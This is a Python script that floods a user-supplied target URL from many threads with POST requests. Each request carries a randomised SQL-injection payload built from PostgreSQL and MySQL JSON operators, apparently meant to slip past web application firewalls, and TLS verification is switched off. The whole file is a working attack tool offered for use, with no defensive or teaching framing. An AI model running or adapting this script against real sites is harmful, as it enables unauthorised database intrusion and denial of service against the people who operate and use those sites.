import requests, time, threading, string
from random import choice, shuffle, choices, randint

def randstring(len, chars=string.ascii_letters):
    return ''.join(choices(chars, k=len))

payloads = [
    '\' or data <@ \'{"{rand}": "{rand}"}\'--',
    '\'{"{rand}":{randint}}\'::jsonb <@ \'{"{rand}":{randint}, "{rand}":{randint}}\'::jsonb',
    '\'{"{rand}":{randint},"{rand}":[{randint},{randint},{"{rand}":{randint}}]}\' -> \'$.c[2].f\' = {randint}',
    'JSON_EXTRACT(\'{"{rand}": {randint}, "{rand}": "{rand}"}\', \'$.name\') = \'{rand}\''
]

shuffle(payloads)

def flooder(
    target: str,
    s: requests.Session, 
    stoptime: float
    ):

    while time.time() < stoptime:
        try:
            payload = (
                choice(payloads)
                .replace('{rand}', randstring(randint(2, 8)))
                .replace('{randint}', str(randint(1, 9)))
            )

            print(f'Sending request with payload "{payload}"')

            s.post(
                f'{target}{str(payload)}'
            )

        except Exception as exc:
            print(f'Error> {str(exc).rstrip()}')

if __name__ == '__main__':
    url = input('target url )> ')
    duration = int(input('duration )> '))
    threads = int(input('threads )> '))

    session = requests.session()
    session.verify = False

    stoptime = time.time() + duration

    threadbox = []
    for _ in range(threads):
        kaboom = threading.Thread(
            target=flooder,
            args=(url, session, stoptime)
        )

        threadbox.append(kaboom)

        kaboom.start()
    
    for kaboom in threadbox:
        kaboom.join()
    
    print('\n\nDone')